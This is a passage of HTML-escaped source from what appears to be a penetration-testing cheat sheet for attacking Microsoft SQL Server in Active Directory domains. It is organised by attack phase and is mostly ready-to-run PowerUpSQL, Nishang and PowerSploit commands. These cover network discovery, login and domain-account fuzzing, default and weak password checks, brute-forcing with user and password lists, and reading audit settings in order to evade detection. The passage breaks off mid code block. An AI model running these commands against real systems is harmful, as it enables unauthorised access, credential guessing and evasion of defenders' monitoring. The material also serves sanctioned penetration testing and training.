&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Help&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">FUNCTION_NAME&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-Full&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="discovery">Discovery&lt;/h2>
&lt;h3 id="net-classes---remote-discovery">.NET Classes - Remote Discovery&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">System.Data.Sql.SqlDataSourceEnumerator&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetDataSources&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="local-discovery">Local Discovery&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Local User&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: Locate services and registry keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="remote-discovery">Remote Discovery&lt;/h3>
&lt;p>List SQL Servers using UDP port scan:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: UDP port scan&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceScanUDP&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceScanUDPThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get the instance list from a file &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceFile&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">temp&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">computers&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLInstanceScanUDPThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List SQL Servers using UDP broadcast ping:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: UDP broadcast ping&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceBroadcast&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List SQL Servers using TCP port scan (MSSQL exposes port 1433):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: TCP port scan&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-StartAddress&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">START_IP_ADDRESS&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-EndAddress&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">END_IP_ADDRESS&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-ScanPort&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">1433&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: TCP port scan&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="mf">1433&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$result&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">hostname&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List Active Directory Domain SQL Server Instances:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Using current domain credentials:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Domain User&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: Query ADS via LDAP for SPNs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List SQL Server instances running as a specific domain account&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-DomainAccount&lt;/span> &lt;span class="s2">&amp;#34;SQLSvc&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List shared domain user SQL Server service accounts (not machine account &amp;#34;*$&amp;#34;):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Group-Object&lt;/span> &lt;span class="n">DomainAccount&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Sort-Object&lt;/span> &lt;span class="n">count&lt;/span> &lt;span class="n">-Descending&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Count&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Name&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-notlike&lt;/span> &lt;span class="s2">&amp;#34;*$&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">count&lt;/span> &lt;span class="o">-gt&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using alternative domain credentials:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;CYBERCORP\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-DomainController&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP-DC.CYBERCORP.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;PASSWORD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="initial-access">Initial Access&lt;/h2>
&lt;p>&lt;strong>How do I get access?&lt;/strong>&lt;/p>
&lt;p>Common Methods:&lt;/p>
&lt;ul>
&lt;li>Attempt to login with local or domain user privileges (Very Common)&lt;/li>
&lt;li>Computer accounts work too ☺&lt;/li>
&lt;li>Weak SQL Server login passwords&lt;/li>
&lt;li>Default SQL Server login passwords&lt;/li>
&lt;li>Default SQL Server login passwords associated with 3rd party applications&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Why can domain users log to SQL Server?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Domain users added to role (Week devops)&lt;/li>
&lt;li>Local users added to role&lt;/li>
&lt;li>Privilege inheritance (Mostly express versions)&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="./mssql_users.png" alt="MSSQL Users" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="check-sql-server-accessibility">Check SQL Server accessibility&lt;/h3>
&lt;h4 id="unauthenticated-user">Unauthenticated user&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceUDPScan&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">15&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;testuser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;testpass&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="local-user">Local user&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Local User&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="domain-user">Domain user&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Domain User&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get a list of domain SQL servers that can be logged into with a provided SQL Server login&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-username&lt;/span> &lt;span class="s2">&amp;#34;testuser&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;testpass&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="alternative-domain-user">Alternative domain user&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Alternative Domain User&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get a list of domain SQL servers that can be logged into using an alternative domain account from a non domain system.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;CYBERCORP\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-DomainController&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP-DC.CYBERCORP.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;PASSWORD&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">15&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="password-guessing">Password Guessing&lt;/h3>
&lt;p>Discover domain SQL Servers and determine if they are configured with default passwords used by common 3rd party applications based on the instance name (it covers 41 application specific default SQL Server instances, users and passwords):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-SQLAuditDefaultLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-SQLAuditDefaultLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is possible to create a user list using the following methods:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzServerLogin&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Enumerates &lt;strong>domain groups&lt;/strong>, &lt;strong>computer accounts&lt;/strong>, and &lt;strong>user accounts&lt;/strong> based on domain RID using SUSER_SNAME() and only the Public role. Note: In a typical domain 10000 or more is recommended for the EndId. (Blindly enumerate domain users and group associated with the SQL Server domain with least privilege SQL login):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">10000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Enumerate all SQL Logins as least privilege user and test username as password (Custom user/password lists can also be provided):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditWeakLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditWeakLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-UserFile&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\users.txt&amp;#34;&lt;/span> &lt;span class="n">-PassFile&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\passwords.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$comps&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">ComputerName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$comps&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-BruteForce&lt;/span> &lt;span class="n">-UserList&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\users.txt&amp;#34;&lt;/span> &lt;span class="n">-PasswordList&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\passwords.txt&amp;#34;&lt;/span> &lt;span class="n">-Service&lt;/span> &lt;span class="n">SQL&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &amp;ldquo;sa&amp;rdquo; user is always present, but it is disabled by default (if enabled it can always be brute-forced).&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="defense-evasion">Defense Evasion&lt;/h3>
&lt;p>In order to evade defense it is suggested to use techniques that aren’t being audited:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Get audit server specifications from target SQL Servers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAuditServerSpec&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Get audit database specifications from target SQL Servers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAuditDatabaseSpec&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="information-gathering">Information Gathering&lt;/h3>
&lt;p>Get information (SQL/OS versions, service accounts, &amp;hellip;) from a single server and check if the current user has sysadmin privs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get information from domain servers and check if the current user has sysadmin privs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfoThreaded&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of non-default databases:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDatabaseThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLDumpInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find sensitive data based on column name:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
